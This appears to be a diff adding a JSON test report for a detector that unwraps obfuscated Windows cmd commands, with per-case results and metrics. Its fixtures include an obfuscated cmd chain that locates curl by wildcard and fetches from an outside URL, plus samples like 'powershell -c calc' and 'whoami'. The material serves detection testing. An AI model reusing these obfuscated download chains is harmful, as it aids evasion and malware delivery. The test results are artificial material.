@@ -1,0 +1,466 @@
+{
+  "engine_version": "0.2.0-gate2a",
+  "generated_at": "2026-09-02T09:51:58.950450+00:00",
+  "tracks": {
+    "A": {
+      "status": "RUN_VIA_C",
+      "note": "Fixture corpus (523 files, 48 categories) is exercised transitively by the P0-1 corpus (Track C) via canonicalize()."
+    },
+    "B": {
+      "status": "RUN",
+      "trust_corpus": 18,
+      "nvkc_command_line": 9,
+      "note": "Not scored at Gate 2A (schema alignment deferred); presence verified."
+    },
+    "C": {
+      "status": "RUN",
+      "run": true,
+      "n_total": 76,
+      "verdict_accuracy": 0.9142857142857143,
+      "malicious_fn": [
+        "mal-20"
+      ],
+      "benign_fp": [],
+      "surface_mal_f1": 0.8928571428571428
+    },
+    "D": {
+      "status": "RUN",
+      "note": "Historical regression suites (test_adversarial_regression, test_corpus_phase2_regression, test_r23_regression_corpus) already green after P0-1A acceptance; not re-run here to keep this harness within the decoder scope."
+    },
+    "E": {
+      "status": "BLOCKED",
+      "reason": "Awaiting offline corpus regeneration (Invoke-DOSfuscation / Invoke-Obfuscation) in an isolated environment \u2014 Gate 2F."
+    },
+    "F": {
+      "status": "BLOCKED",
+      "reason": "New semantic corpus is a Phase-2F deliverable."
+    },
+    "G": {
+      "status": "RUN",
+      "gate": "2A (partial \u2014 full semantic closure is Gate 2B)",
+      "expected_layers": [
+        "cmd.caret_strip",
+        "cmd.delayed_expansion",
+        "cmd.set_reassembly",
+        "cmd.wrapper_unwrap"
+      ],
+      "actual_layers": [
+        "cmd.caret_strip",
+        "cmd.delayed_expansion",
+        "cmd.set_reassembly",
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_covered": [
+        "cmd.caret_strip",
+        "cmd.delayed_expansion",
+        "cmd.set_reassembly",
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_missing": [],
+      "substrings_ok": [
+        "where c*d.e?e",
+        "where c*u*r*l.e?e",
+        "where p*ell.exe",
+        "https://tommy-aa.lol/f"
+      ],
+      "substrings_missing": [],
+      "final_preview": "start  /min cmd /v:on /k echo off&set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&set t2x7=where p*ell.exe&for /f %i in ('where c*d.e?e')do %i /c for /f %k in ('where c*u*r*l.e?e')do %k https://tomm",
+      "gate_2a_pass": true
+    }
+  },
+  "semantic": [
+    {
+      "id": "sem-caret-01",
+      "category": "caret",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip"
+      ],
+      "substr_actual": "https://tommy-aa.lol/f",
+      "substr_expected": [
+        "https://tommy-aa.lol/f"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.0333840143866837,
+      "notes": ""
+    },
+    {
+      "id": "sem-caret-02",
+      "category": "caret",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip"
+      ],
+      "substr_actual": "powershell -c calc",
+      "substr_expected": [
+        "powershell -c calc"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.03558001480996609,
+      "notes": ""
+    },
+    {
+      "id": "sem-caret-03",
+      "category": "caret-negative",
+      "passed": true,
+      "partial": true,
+      "benign": true,
+      "layers_actual": [],
+      "layers_expected": [],
+      "substr_actual": "echo hello",
+      "substr_expected": [],
+      "unresolved": [
+        "no CMD/PS/Bash surface detected by heuristic; Plane-A codec sub-engines not yet wired (P0-1B Gate 2D)."
+      ],
+      "latency_ms": 0.01042999792844057,
+      "notes": ""
+    },
+    {
+      "id": "sem-caret-04",
+      "category": "caret-quoted",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "echo \"carets ^ inside quotes ^ are literal\"",
+      "substr_expected": [
+        "\"carets ^ inside quotes ^ are literal\""
+      ],
+      "unresolved": [],
+      "latency_ms": 0.022539985366165638,
+      "notes": ""
+    },
+    {
+      "id": "sem-set-01",
+      "category": "set",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "substr_actual": "set a=power&set b=shell&powershell -c ipconfig",
+      "substr_expected": [
+        "powershell -c ipconfig"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.03527099033817649,
+      "notes": ""
+    },
+    {
+      "id": "sem-set-02",
+      "category": "set",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "substr_actual": "set \"u=cmd\" & set \"v=/c\" & cmd /c dir",
+      "substr_expected": [
+        "cmd /c dir"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.031050993129611015,
+      "notes": ""
+    },
+    {
+      "id": "sem-set-03",
+      "category": "set-benign",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [
+        "cmd.set_reassembly"
+      ],
+      "layers_expected": [
+        "cmd.set_reassembly"
+      ],
+      "substr_actual": "set path=C:\\Users\\alice&dir",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.021016981918364763,
+      "notes": ""
+    },
+    {
+      "id": "sem-bang-01",
+      "category": "bang",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.delayed_expansion"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.delayed_expansion"
+      ],
+      "substr_actual": "set q=whoami&whoami",
+      "substr_expected": [
+        "whoami"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.0960840261541307,
+      "notes": ""
+    },
+    {
+      "id": "sem-bang-02",
+      "category": "bang-negative",
+      "passed": true,
+      "partial": true,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly"
+      ],
+      "substr_actual": "set q=whoami&!q!",
+      "substr_expected": [],
+      "unresolved": [
+        "!VAR! references found but /V:ON / SETLOCAL EnableDelayedExpansion NOT declared \u2014 cmd.exe would treat these as literal."
+      ],
+      "latency_ms": 0.02327800029888749,
+      "notes": ""
+    },
+    {
+      "id": "sem-envvar-01",
+      "category": "envvar-unresolved",
+      "passed": true,
+      "partial": true,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "echo %USERNAME%",
+      "substr_expected": [],
+      "unresolved": [
+        "%USERNAME% (system env \u2014 unresolved by design)"
+      ],
+      "latency_ms": 0.017144018784165382,
+      "notes": ""
+    },
+    {
+      "id": "sem-benign-01",
+      "category": "benign",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "ipconfig /all",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.013371987733989954,
+      "notes": ""
+    },
+    {
+      "id": "sem-benign-02",
+      "category": "benign",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "dir C:\\Users",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.012323958799242973,
+      "notes": ""
+    },
+    {
+      "id": "sem-malformed-01",
+      "category": "malformed",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "^",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.012007018085569143,
+      "notes": ""
+    },
+    {
+      "id": "sem-malformed-02",
+      "category": "malformed",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly"
+      ],
+      "substr_actual": "set a=&",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.024361012037843466,
+      "notes": ""
+    }
+  ],
+  "per_category": {
+    "caret": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "caret-negative": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "caret-quoted": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "set": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "set-benign": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "bang": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "bang-negative": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "envvar-unresolved": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "benign": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 2,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "malformed": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    }
+  },
+  "aggregates": {
+    "semantic_total": 14,
+    "semantic_pass": 14,
+    "semantic_fail": 0,
+    "benign_cases": 6,
+    "benign_fp_flagged": 0,
+    "unresolved_cases": 3,
+    "latency_ms_p50": 0.023,
+    "latency_ms_p95": 0.036,
+    "latency_ms_p99": 0.096,
+    "codec_layer": "SCAFFOLD_ONLY \u2014 Plane-A sub-engines not yet wired at Gate 2A.",
+    "semantic_layer": "RUN",
+    "fullchain_layer": "RUN (Track G)"
+  }
+}
